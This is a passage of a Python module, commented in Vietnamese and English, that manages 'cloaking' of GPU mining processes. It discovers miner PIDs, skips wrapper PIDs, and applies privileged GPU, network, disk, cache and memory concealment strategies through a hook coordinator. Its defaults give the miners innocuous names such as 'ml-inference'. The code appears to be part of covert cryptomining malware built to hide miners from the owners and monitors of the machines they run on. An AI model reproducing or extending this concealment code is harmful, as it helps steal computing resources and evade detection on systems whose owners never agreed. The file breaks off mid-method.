"""
Module resource_manager.py - Quản lý tài nguyên GPU theo mô hình đồng bộ (threading).
Sau khi refactor, module này:
- BỎ toàn bộ cơ chế giám sát (nhiệt độ, công suất) & watchers.
- BỎ cơ chế restore hoàn toàn.
- Khi start, tự động khám phá tiến trình và CLOAK luôn.
- Chỉ hỗ trợ cloaking, không có restoration.
"""

import logging
import psutil
import pynvml
import traceback
import threading
import concurrent.futures  # ✅ NEW: ThreadPoolExecutor for per-strategy timeout
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from itertools import count

# Các import liên quan đến dự án
from .utils import MiningProcess
from .resource_control import ResourceControlFactory, CloakStrategyFactory
from .auxiliary_modules.interfaces import IResourceManager
from .auxiliary_modules.models import ConfigModel
# 🗑️ EventBus import removed - using DirectPIDRegistry instead
from .privileged_operations import get_privileged_manager
from .unified_logging import get_unified_logger
from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ INTELLIGENT CACHING: Use advanced strategy cache system
from .strategy_cache import get_strategy_cache, CacheEvictionPolicy

class SharedResourceManager:
    """
    Lớp quản lý tài nguyên GPU.
    - Khởi tạo/tắt NVML
    - Đọc GPU usage, cache usage
    - Áp dụng CloakStrategy cho tiến trình
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        # ✅ UNIFIED: Use unified logger for consistent logging
        self.logger = get_unified_logger('resource_manager')
        self.config = config
        self.resource_managers = resource_managers
        # ✅ INTELLIGENT CACHING: Replace simple dict with intelligent cache system
        self.strategy_cache = get_strategy_cache(
            max_size=500,  # Reasonable size for strategy objects
            ttl_seconds=7200.0,  # 2 hours TTL for strategy objects
            eviction_policy=CacheEvictionPolicy.INTELLIGENT
        )
        
        # ✅ CACHE METRICS: Track cache performance
        self.cache_metrics_interval = 300  # 5 minutes
        self.last_cache_metrics_log = time.time()
        
        # Khởi tạo PrivilegedOperationManager (singleton)
        self.privileged_manager = get_privileged_manager(logger)
        
        # Kiểm tra security context
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        self._nvml_init = False
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager khởi tạo OK.")
        except Exception as e:
            self.logger.error(f"Lỗi init SharedResourceManager: {e}\n{traceback.format_exc()}")
            raise

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self):
        """**Thread-safe NVML initialization** (khởi tạo NVML an toàn luồng) với **threading-based timeout** (thời gian chờ dựa trên luồng)"""
        if not self._nvml_init:
            try:
                # ✅ FIXED: Thread-safe NVML initialization với concurrent.futures timeout
                self.logger.debug("Thread-safe NVML initialization...")
                
                # ✅ THREADING-BASED TIMEOUT: Safer for multi-threading environment
                import time
                
                def nvml_init_worker():
                    """Worker function for NVML initialization"""
                    try:
                        pynvml.nvmlInit()
                        return True
                    except Exception as e:
                        self.logger.debug(f"NVML init worker exception: {e}")
                        raise
                
                # ✅ THREAD-SAFE: Use ThreadPoolExecutor với timeout
                with concurrent.futures.ThreadPoolExecutor(max_workers=1, thread_name_prefix="NVML_Init") as executor:
                    future = executor.submit(nvml_init_worker)
                    
                    try:
                        # ✅ CONFIGURABLE TIMEOUT: 3-second timeout for NVML init
                        result = future.result(timeout=3.0)
                        self._nvml_init = True
                        self.logger.info("✅ NVML đã được khởi tạo thành công (thread-safe mode)")
                        
                    except concurrent.futures.TimeoutError:
                        self.logger.warning("⏰ NVML initialization timeout after 3s - continuing without GPU support")
                        future.cancel()  # Cancel the running task
                        self._nvml_init = False
                    
            except Exception as e:
                self.logger.warning(f"❌ NVML initialization failed: {e} - continuing without GPU support")
                self._nvml_init = False

    def shutdown_nvml(self):
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.debug("Đã shutdown NVML thành công.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi khi shutdown NVML: {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """
        Đọc /proc/[pid]/status => VmCache => tính % so với total RAM.
        """
        try:
            status_file = f"/proc/{pid}/status"
            with open(status_file, 'r') as f:
                for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        try:
            return self._sync_get_gpu_usage_percent(pid)
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        try:
            if not self.is_nvml_initialized():
                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
                self.initialize_nvml()

            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu

            return total_gpu_usage if gpu_present else 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng chiến lược cloak cho một tiến trình cụ thể.
        """
        try:
            pid = process.pid
            name = process.name
            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )
            if not strategy or not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
                return

            # Inject privileged_manager nếu strategy cần
            if hasattr(strategy, 'set_privileged_manager'):
                strategy.set_privileged_manager(self.privileged_manager)

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            
            # **COORDINATED CLOAKING**: Use coordination for memory strategy (che giấu có phối hợp cho chiến lược bộ nhớ)
            if strategy_name == 'memory' and hasattr(strategy, 'apply_with_coordination'):
                try:
                    # **Import coordinator** (nhập điều phối viên)
                    import sys
                    import os
                    coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
                    if coord_path not in sys.path:
                        sys.path.insert(0, coord_path)
                    from coordinator import get_hook_coordinator
                    
                    coordinator = get_hook_coordinator()
                    
                    self.logger.info(f"🔄 [COORDINATED STRATEGY] Using coordinated memory cloaking for PID={pid}")
                    
                    # **Apply with coordination** (áp dụng với phối hợp)
                    success = strategy.apply_with_coordination(process, coordinator, timeout=70)
                    
                    if success:
                        self.logger.info(f"✅ [COORDINATED SUCCESS] Coordinated memory cloaking completed for PID={pid}")
                    else:
                        self.logger.error(f"❌ [COORDINATED FAILED] Coordinated memory cloaking failed for PID={pid}")
                        self.logger.error(f"🚨 [SAFETY] Memory cloaking was safely ABORTED to prevent std::bad_alloc")
                        return  # **Don't proceed with uncoordinated cloaking** (không tiến hành che giấu không phối hợp)
                        
                except Exception as coord_err:
                    self.logger.error(f"❌ [COORDINATION ERROR] Failed to setup coordination for memory strategy: {coord_err}")
                    self.logger.warning(f"🔄 [FALLBACK] Falling back to standard memory cloaking (UNSAFE)")
                    # **Fallback to standard apply** (dự phòng bằng áp dụng tiêu chuẩn)
                    strategy.apply(process)
            else:
                # **Standard strategy application** (áp dụng chiến lược tiêu chuẩn)
                strategy.apply(process)
                
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

            # ✅ REMOVED: CPU support completely removed

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

class ResourceManager(IResourceManager):
    """
    Lớp ResourceManager chỉ còn chức năng:
    - Khởi tạo SharedResourceManager
    - Khám phá tiến trình (duy nhất 1 lần) và Cloak tất cả
    - Không giám sát, không restore
    """

    _instance = None
    _instance_lock = threading.Lock()

    def __new__(cls, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        # ✅ UNIFIED: Use unified logger for consistent logging hierarchy
        self.logger = get_unified_logger('resource_manager')
        
        # ✅ ENHANCED: Configuration validation before initialization
        self.config = self._validate_configuration(config)
        # 🗑️ **REMOVED**: EventBus completely removed - DirectPIDRegistry handles all process communication

        # Cờ dừng
        self._stop_flag = False

        # Danh sách process + lock
        self.mining_processes_lock = threading.RLock()
        self.mining_processes: List[MiningProcess] = []

        # ✅ REMOVED: GPU-only queue - simplified logic in enqueue_cloaking()

        # 🚀 **DIRECT REGISTRY OBSERVER** (quan sát registry trực tiếp) - **THAY THẾ EVENTBUS**
        self._setup_direct_registry_observer()
        
        # ✅ **LINEAR FLOW INTEGRATION** (tích hợp luồng tuyến tính) - Enhanced coordination tracking
        self._linear_handoff_tracking = {}
        self._linear_handoff_lock = threading.Lock()
        
        # Hàng đợi cloaking chung (legacy compatibility)
        self.resource_adjustment_queue = queue.PriorityQueue()

        # Thread workers
        self.workers: List[threading.Thread] = []

        self.shared_resource_manager: Optional[SharedResourceManager] = None

        self._counter = count()
        # ✅ NEW: Unique worker identifier for logging & cache metadata
        #    Mỗi ResourceManager (và các thread làm việc của nó) sẽ dùng cùng một worker_id
        #    nhằm gắn nhãn (tag) các đối tượng chiến lược được lưu trong cache. Việc này
        #    khắc phục lỗi AttributeError: 'ResourceManager' object has no attribute 'worker_id'.
        self.worker_id = next(self._counter)
        self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"
        
        # ✅ NEW: Wrapper PID tracking - ignore wrapper PIDs, only cloak real mining PIDs
        self.ignored_wrapper_pids = set()  # Track wrapper PIDs to ignore during process discovery
        
        # ✅ ENHANCED: Strategy metrics tracking for success/failure monitoring
        self.strategy_metrics: Dict[int, Dict[str, Any]] = {}  # PID -> metrics data
        
        # ✅ ERROR MANAGEMENT: Initialize error reporter with DirectPIDRegistry architecture
        self.error_reporter = get_error_reporter(None)

        self.logger.info("ResourceManager.__init__ (simplified with unified cloaking queue)")

        # ✅ PROCESS COMMUNICATION: DirectPIDRegistry observers handle all process events
    
    def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
        """
        ✅ NEW: Comprehensive configuration validation với detailed error reporting
        
        :param config: Configuration to validate
        :return: Validated configuration
        :raises: ValueError if configuration is invalid
        """
        try:
            self.logger.info("🔍 Validating ResourceManager configuration...")
            
            # ✅ VALIDATION 1: Check process priority map
            if not hasattr(config, 'process_priority_map'):
                self.logger.warning("⚠️ Missing process_priority_map - using defaults")
                config.process_priority_map = {'ml-inference': 1, 'inference-cuda': 2}
            
            # ✅ VALIDATION 2: Validate priority values
            for process_name, priority in config.process_priority_map.items():
                if not isinstance(priority, int) or priority < 1:
                    self.logger.warning(f"⚠️ Invalid priority for '{process_name}': {priority} - setting to 1")
                    config.process_priority_map[process_name] = 1
            
            # ✅ VALIDATION 3: Check cloaking strategies configuration
            cloaking_strategies = getattr(config, 'cloaking_strategies', None)
            if not cloaking_strategies:
                self.logger.warning("⚠️ No cloaking strategies configured - using defaults")
                default_strategies = {
                    # CPU cloaking completely removed
                    'gpu_cloaking': {'enabled': True},
                    'network': {'enabled': True},
                    'memory': {'enabled': True}
                }
                if hasattr(config, 'data') and isinstance(config.data, dict):
                    config.data['cloaking_strategies'] = default_strategies
                else:
                    # Fallback: set attribute directly
                    setattr(config, 'cloaking_strategies', default_strategies)
            
            # ✅ VALIDATION 4: Validate strategy configurations
            if cloaking_strategies:
                required_strategies = ['gpu_cloaking']  # GPU-only mode
                for strategy in required_strategies:
                    if strategy not in cloaking_strategies:
                        self.logger.warning(f"⚠️ Missing required strategy '{strategy}' - enabling by default")
                        cloaking_strategies[strategy] = {'enabled': True}
                    
                    elif not isinstance(cloaking_strategies[strategy], dict):
                        self.logger.warning(f"⚠️ Invalid configuration for strategy '{strategy}' - resetting")
                        cloaking_strategies[strategy] = {'enabled': True}
            
            # ✅ VALIDATION 5: Configuration method support check
            if not hasattr(config, 'get'):
                self.logger.warning("⚠️ Config missing 'get' method - adding wrapper")
                original_config = config
                
                class ConfigWrapper:
                    def __init__(self, original):
                        self._original = original
                        self.__dict__.update(original.__dict__)
                    
                    def get(self, key, default=None):
                        if hasattr(self._original, 'data') and isinstance(self._original.data, dict):
                            return self._original.data.get(key, default)
                        return getattr(self._original, key, default)
                
                config = ConfigWrapper(original_config)
            
            self.logger.info("✅ Configuration validation completed successfully")
            
            # ✅ LOG CONFIGURATION SUMMARY
            priority_count = len(getattr(config, 'process_priority_map', {}))
            strategy_count = len(getattr(config, 'cloaking_strategies', {}))
            self.logger.info(f"📋 Configuration summary: {priority_count} process priorities, {strategy_count} cloaking strategies")
            
            return config
            
        except Exception as e:
            error_msg = f"❌ Configuration validation failed: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg) from e

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU (NVML) đã được khởi tạo hay chưa.
        """
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()

    def handle_resource_adjustment(self, event_data: Dict[str, Any]):
        """
        ✅ SIMPLIFIED: Minimal resource adjustment handler
        """
        try:
            pid = event_data.get('pid')
            adjustment_type = event_data.get('type', 'unknown')
            
            self.logger.info(f"Processing resource adjustment for PID={pid}, type={adjustment_type}")
            
        except Exception as e:
            self.logger.error(f"❌ Error in resource adjustment processing: {e}")

    def _setup_direct_registry_observer(self):
        """
        🚀 **Direct Registry Observer Setup** (thiết lập quan sát registry trực tiếp)
        
        CORE REPLACEMENT cho EventBus subscriptions - sử dụng DirectPIDRegistry observers.
        Đăng ký ResourceManager làm observer để nhận immediate notifications
        khi có process mới được registered trong DirectPIDRegistry.
        """
        try:
            self.logger.info("🔌 Setting up DirectPIDRegistry Observer (DirectPIDRegistry replaces EventBus)...")
            
            # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
            try:
                from pid_logger.direct_registry import get_direct_registry
                self.direct_registry = get_direct_registry()
            except ImportError as import_err:
                self.logger.error(f"❌ Failed to import DirectPIDRegistry: {import_err}")
                self.logger.warning("⚠️ Running without Direct Registry - falling back to periodic discovery only")
                self.direct_registry = None
                return
            
            # **Register ResourceManager as observer** (đăng ký ResourceManager làm observer)
            if self.direct_registry:
                success = self.direct_registry.register_observer(self._on_process_registered_direct)
                
                if success:
                    self.logger.info("✅ Direct Registry Observer established successfully")
                    self.logger.info("📊 ResourceManager will receive immediate process notifications")
                    
                    # **Debug: Display current registry statistics** (hiển thị thống kê registry hiện tại)
                    try:
                        stats = self.direct_registry.get_statistics()
                        self.logger.debug(f"[REGISTRY-STATS] {stats}")
                    except Exception as stats_err:
                        self.logger.debug(f"[REGISTRY-STATS] Unable to read stats: {stats_err}")
                        
                else:
                    self.logger.error("❌ Failed to register Direct Registry Observer")
                    self.direct_registry = None
            
        except Exception as e:
            self.logger.error(f"❌ Direct Registry Observer setup failed: {e}")
            self.logger.warning("⚠️ Running without Direct Registry - using periodic discovery only")
            self.direct_registry = None

    # CPU event handling completely removed - GPU-only mode

    def _on_process_registered_direct(self, process_info) -> None:
        """
        🚀 **Direct Process Registration Handler** (xử lý đăng ký tiến trình trực tiếp)
        
        CORE REPLACEMENT cho _on_gpu_mining_event().
        Nhận ProcessInfo object trực tiếp từ DirectPIDRegistry thay vì event payload.
        
        Args:
            process_info: ProcessInfo object chứa thông tin mining process
        """
        try:
            # **Extract process information** (trích xuất thông tin tiến trình)
            pid = process_info.pid
            process_type = process_info.process_type
            process_name = process_info.process_name
            metadata = process_info.metadata or {}
            
            # **Get registration source** (lấy nguồn đăng ký)
            registration_source = metadata.get('registration_source', 'unknown')
            role = metadata.get('role', 'real')  # Direct registry sends real PID
            stealth_enabled = metadata.get('stealth_enabled', False)
            
            self.logger.info(f"🚀 [DIRECT-REGISTRY] ResourceManager received process registration:")
            self.logger.info(f"   ├─ PID: {pid}")
            self.logger.info(f"   ├─ Type: {process_type}")
            self.logger.info(f"   ├─ Name: {process_name}")
            self.logger.info(f"   ├─ Role: {role}")
            self.logger.info(f"   ├─ Source: {registration_source}")
            self.logger.info(f"   └─ Stealth: {stealth_enabled}")
            
            # **Process GPU mining process registration** (xử lý đăng ký tiến trình khai thác GPU)
            if process_type == "gpu":
                self.logger.info(f"🎮 Processing GPU mining process: PID={pid}, Name={process_name}")
                
                # **ENHANCED: Real PID handling** (xử lý PID thật nâng cao)
                if role == 'real':
                    self.logger.info(f"✅ [REAL-PID] Direct registry provided REAL mining PID: {pid}")
                    
                    # **Immediate cloaking activation** (kích hoạt cloaking tức thì)
                    self.logger.info(f"🔒 [IMMEDIATE-CLOAKING] Activating cloaking for real mining PID {pid}")
                    
                    # **Add to mining processes for tracking** (thêm vào danh sách mining processes để theo dõi)
                    try:
                        mining_process = MiningProcess(
                            pid=pid,
                            process_type=process_type,
                            process_name=process_name,
                            start_time=process_info.start_time,
                            process_obj=process_info.process_obj
                        )
                        
                        with self.mining_processes_lock:
                            # **Check for duplicates** (kiểm tra trùng lặp)
                            existing = [p for p in self.mining_processes if p.pid == pid]
                            if not existing:
                                self.mining_processes.append(mining_process)
                                self.logger.info(f"📋 Added mining process to tracking list: PID={pid}")
                            else:
                                self.logger.info(f"📋 Mining process already tracked: PID={pid}")
                        
                        # **Trigger immediate plugin activation** (kích hoạt plugin tức thì)
                        self._trigger_immediate_cloaking(mining_process)
                        
                    except Exception as tracking_err:
                        self.logger.error(f"❌ Failed to add mining process to tracking: {tracking_err}")
                else:
                    # **Wrapper PID handling** (xử lý PID wrapper)
                    self.logger.info(f"📦 [WRAPPER-PID] Adding wrapper PID to ignored list: {pid}")
                    if not hasattr(self, 'ignored_wrapper_pids'):
                        self.ignored_wrapper_pids = set()
                    self.ignored_wrapper_pids.add(pid)
                    
            else:
                self.logger.warning(f"⚠️ Unsupported process type: {process_type}")
                
        except Exception as e:
            error_msg = f"❌ Error in direct process registration handler: {e}"
            self.logger.error(error_msg)
            # **Error reporting** (báo cáo lỗi)
            report_error(
                ErrorCode.RESOURCE_MANAGER_ERROR,
                error_msg,
                ErrorSeverity.HIGH
            )
    
    def _trigger_immediate_cloaking(self, mining_process) -> None:
        """
        🚀 **Immediate Cloaking Activation** (kích hoạt cloaking tức thì)
        
        PHASE 3++: Enhanced với Hook Coordinator integration
        Chờ PHASE 3+ completion trước khi activate cloaking.
        
        Args:
            mining_process: MiningProcess object cần apply cloaking
        """
        try:
            # PHASE 3++: Check hook readiness trước khi activate cloaking
            try:
                import sys
                import os
                # ✅ FIXED: Correct import path for coordination module
                coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
                if coord_path not in sys.path:
                    sys.path.insert(0, coord_path)
                from coordinator import get_hook_coordinator
                
                coordinator = get_hook_coordinator()
                pid = mining_process.pid
                
                self.logger.info(f"🔍 [PHASE3++] Checking hook readiness for PID {pid}")
                
                # ✅ ENHANCED DEBUG: Log current coordinator state
                self.logger.debug(f"🔍 [DEBUG] Current hooks_ready state: {getattr(coordinator, 'hooks_ready', {})}")
                
                # ✅ AUTO-REGISTRATION FALLBACK: Register PID if not already registered
                if pid not in getattr(coordinator, 'hooks_ready', {}):
                    self.logger.warning(f"⚠️ [AUTO-REGISTER] PID {pid} not in coordinator - auto-registering as fallback")
                    coordinator.register_pid(pid)
                    # Give some time for hooks to initialize
                    time.sleep(2)
                
                # ✅ MEMORY-SAFE: Check if hooks are ready từ PHASE 3+ completion
                if coordinator.check_hooks_ready(pid):
                    self.logger.info(f"✅ [PHASE3++] Hooks ready for PID {pid} - proceeding with coordinated cloaking")
                else:
                    self.logger.warning(f"⚠️ [MEMORY-SAFETY] Hooks not ready for PID {pid} - this may cause memory conflicts")
                    self.logger.info(f"⏳ [PHASE3++] Waiting for hook coordination before cloaking...")
                    
                    # ✅ CRITICAL: Wait for hooks với timeout để tránh memory conflicts
                    if coordinator.wait_for_hooks_ready(pid, timeout=70):
                        self.logger.info(f"✅ [PHASE3++] Hooks became ready for PID {pid} - safe to proceed with cloaking")
                    else:
                        self.logger.error(f"🚨 [MEMORY-SAFETY] Timeout waiting for hooks PID {pid}")
                        self.logger.error(f"⚠️ [CRITICAL] Hook coordination FAILED - ABORTING cloaking to prevent std::bad_alloc")
                        self.logger.error(f"💀 [ANALYSIS] Uncoordinated cloaking is the PRIMARY cause of std::bad_alloc")
                        self.logger.error(f"🛡️ [SAFETY] Immediate cloaking ABORTED for system protection")
                        
                        # **ABORT CLOAKING** instead of force proceed (HỦY BỎ CHE GIẤU thay vì buộc tiến hành)
                        self.logger.error(f"❌ [ABORT] Immediate cloaking cancelled for PID {pid}")
                        return  # **EXIT early to prevent uncoordinated cloaking** (thoát sớm để ngăn che giấu không phối hợp)
                        
            except Exception as coord_err:
                self.logger.error(f"❌ [PHASE3++] Hook Coordinator check failed: {coord_err}")
                self.logger.error(f"🚨 [CRITICAL] Cannot verify hook readiness - high risk of memory conflicts")
                self.logger.warning(f"🔄 [FALLBACK] Proceeding with cloaking activation anyway (unsafe)")
            
            self.logger.info(f"🔒 [IMMEDIATE-CLOAKING] Starting immediate cloaking for PID {mining_process.pid}")
            
            # **Create high-priority cloaking task** (tạo nhiệm vụ cloaking ưu tiên cao)
            cloaking_task = (
                0,  # Highest priority
                time.time(),  # Timestamp
                {
                    'action': 'immediate_cloak',
                    'process': mining_process,
                    'source': 'direct_registry',
                    'urgent': True
                }
            )
            
            # **Enqueue for immediate processing** (xếp hàng để xử lý tức thì)
            self.resource_adjustment_queue.put(cloaking_task)
            self.logger.info(f"⚡ [IMMEDIATE-CLOAKING] High-priority cloaking task queued for PID {mining_process.pid}")
            
            # **Optional: Force process discovery refresh** (tùy chọn: buộc làm mới khám phá tiến trình)
            if hasattr(self, 'shared_resource_manager'):
                try:
                    # **Manual process discovery trigger** (kích hoạt khám phá tiến trình thủ công)
                    self.logger.debug(f"🔍 [IMMEDIATE-CLOAKING] Triggering process discovery refresh")
                    # Note: Actual discovery implementation would be called here
                except Exception as discovery_err:
                    self.logger.warning(f"⚠️ [IMMEDIATE-CLOAKING] Process discovery refresh failed: {discovery_err}")
            
            self.logger.info(f"✅ [IMMEDIATE-CLOAKING] Immediate cloaking activation completed for PID {mining_process.pid}")
            
        except Exception as e:
            self.logger.error(f"❌ [IMMEDIATE-CLOAKING] Failed to trigger immediate cloaking: {e}")
            # **Continue processing** (tiếp tục xử lý) - don't fail the entire registration

    def enqueue_cloaking(self, process: MiningProcess) -> None:
        """
        ✅ ENHANCED: Comprehensive multi-strategy cloaking queue với full resource control
        """
        pid = process.pid
        name = process.name
        
        # ✅ DIAGNOSTIC: Log entry point với DEBUG level
        self.logger.debug(f"🔍 [DIAGNOSTIC] enqueue_cloaking called for {name} (PID={pid})")
        self.logger.debug(f"📊 Current process_states: {dict(list(self.process_states.items())[:5])}...")
        
        try:
            if self.process_states.get(pid) == "cloaked":
                self.logger.debug(f"PID={pid} đã được cloaked, bỏ qua.")
                return

            priority = process.priority
            count_val = next(self._counter)
            
            # ✅ DIRECT ACCESS: Get type từ enhanced MiningProcess
            process_type = process.get_process_type()
            is_gpu = process.is_gpu_process()
            strategy_hints = process.get_strategy_hints()
            
            # ✅ COMPREHENSIVE STRATEGY ASSIGNMENT: Multi-dimensional cloaking
            # ✅ GPU-ONLY: Primary strategy always GPU
            primary_strategy = 'gpu_cloaking'  # GPU-only processing
            
            # ✅ CONFIGURABLE ADDITIONAL STRATEGIES: Based on config and process type
            additional_strategies = self._get_additional_strategies(process_type, strategy_hints)
            
            # ✅ COMBINED STRATEGY LIST: Primary + Additional for comprehensive cloaking
            all_strategies = [primary_strategy] + additional_strategies
            
            # ✅ STRATEGY FILTERING: Remove strategies not available in current system
            available_strategies = self._filter_available_strategies(all_strategies)
            
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': available_strategies,  # ✅ MULTIPLE STRATEGIES for comprehensive control
                'process_type': process_type,
                'strategy_hints': strategy_hints,
                'primary_strategy': primary_strategy,  # ✅ Track primary for priority handling
                'additional_strategies': additional_strategies  # ✅ Track additional for logging
            }
            
            # ✅ UNIFIED: Single queue với rich multi-strategy metadata
            self.resource_adjustment_queue.put((priority, count_val, task))
            self.process_states[pid] = "cloaking"
            
            # ✅ ENHANCED: Detailed enqueue_cloaking logging với strategy breakdown
            self.logger.info(f"✅ Enqueued {name} (PID={pid}) for comprehensive {process_type} cloaking")
            self.logger.info(f"🎯 Primary strategy: {primary_strategy}")
            self.logger.info(f"🔧 Additional strategies: {additional_strategies}")
            self.logger.info(f"📋 Available strategies: {available_strategies}")
            self.logger.info(f"💡 Strategy hints applied: {strategy_hints}")
            self.logger.info(f"⚖️ Queue priority: {priority}, count: {count_val}")
            self.logger.info(f"🧠 Process classification: {process_type}, GPU: {is_gpu}")
            
        except Exception as e:
            self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")

    def _get_additional_strategies(self, process_type: str, strategy_hints: Dict[str, Any]) -> List[str]:
        """
        ✅ NEW: Determine additional strategies based on process type and configuration
        
        :param process_type: 'GPU' process type only
        :param strategy_hints: Optimization hints từ process metadata
        :return: List of additional strategy names
        """
        try:
            # ✅ BASE ADDITIONAL STRATEGIES: Core resource control strategies
            base_strategies = ['network', 'disk_io', 'cache', 'memory']
            
            # ✅ STRATEGY HINTS PROCESSING: Custom strategy selection
            if strategy_hints:
                # Disable specific strategies if hinted
                disabled_strategies = strategy_hints.get('disabled_strategies', [])
                enabled_additional = [s for s in base_strategies if s not in disabled_strategies]
                
                # Add custom strategies if specified
                custom_strategies = strategy_hints.get('additional_strategies', [])
                enabled_additional.extend(custom_strategies)
                
                return enabled_additional
            
            # ✅ GPU-ONLY PROCESSING: Only GPU process types supported
            if process_type == 'GPU':
                # GPU processes: thermal management integrated directly trong gpu_cloaking
                # ✅ UNIFIED: ThermalControlStrategy removed - thermal control is built into GpuCloakStrategy
                return base_strategies  # thermal management fully integrated trong gpu_cloaking
            else:
                # Unknown process type, use conservative approach
                return ['network', 'memory']  # Minimal additional strategies
                
        except Exception as e:
            self.logger.error(f"Error determining additional strategies: {e}")
            return ['network', 'memory']  # Fallback to basic strategies

    def _filter_available_strategies(self, strategies: List[str]) -> List[str]:
        """
        ✅ NEW: Filter strategies based on system availability and configuration
        
        :param strategies: List of strategy names to filter
        :return: List of available strategy names
        """
        try:
            available = []
            
            for strategy in strategies:
                # ✅ CHECK STRATEGY AVAILABILITY: Verify each strategy can be used
                if self._is_strategy_available(strategy):
                    available.append(strategy)
                else:
                    self.logger.debug(f"Strategy '{strategy}' not available, skipping")
            
            # ✅ ENSURE PRIMARY STRATEGY: Always include at least primary strategy
            if not available and strategies:
                primary = strategies[0]  # First strategy is primary
                if self._is_strategy_available(primary):
                    available.append(primary)
                    self.logger.warning(f"Only primary strategy '{primary}' available")
            
            return available
            
        except Exception as e:
            self.logger.error(f"Error filtering available strategies: {e}")
            # Fallback to primary strategy only
            return [strategies[0]] if strategies else []

    def _is_strategy_available(self, strategy_name: str) -> bool:
        """
        ✅ NEW: Check if a specific strategy is available in current system
        
        :param strategy_name: Name of strategy to check
        :return: True if strategy is available and can be used
        """
        try:
            # ✅ CONFIG-BASED AVAILABILITY: Check configuration settings
            strategy_config = self.config.get('cloaking_strategies', {})
            if not strategy_config.get(strategy_name, {}).get('enabled', True):
                return False
            
            # ✅ SYSTEM-BASED AVAILABILITY: Check system capabilities
            availability_checks = {
                # CPU cloaking completely removed
                'gpu_cloaking': self.is_gpu_initialized(),  # Requires GPU
                'network': self._check_network_availability(),
                'disk_io': self._check_disk_io_availability(), 
                'cache': self._check_cache_availability(),
                'memory': self._check_memory_availability(),
                # ✅ REMOVED: 'thermal_control' - thermal management integrated trong gpu_cloaking
            }
            
            return availability_checks.get(strategy_name, False)
            
        except Exception as e:
            self.logger.debug(f"Error checking strategy availability for '{strategy_name}': {e}")
            return False

    def _check_network_availability(self) -> bool:
        """Check if network cloaking is available (iptables, tc)"""
        try:
            # Check if we have network resource manager
            return 'network' in getattr(self.shared_resource_manager, 'resource_managers', {})
        except:
            return False

    def _check_disk_io_availability(self) -> bool:
        """Check if disk I/O cloaking is available (ionice)"""
        try:
            # Check if we have disk I/O resource manager
            return 'disk_io' in getattr(self.shared_resource_manager, 'resource_managers', {})
        except:
            return False

    def _check_cache_availability(self) -> bool:
        """Check if cache cloaking is available"""
        try:
            # Check if we have cache resource manager
            return 'cache' in getattr(self.shared_resource_manager, 'resource_managers', {})
        except:
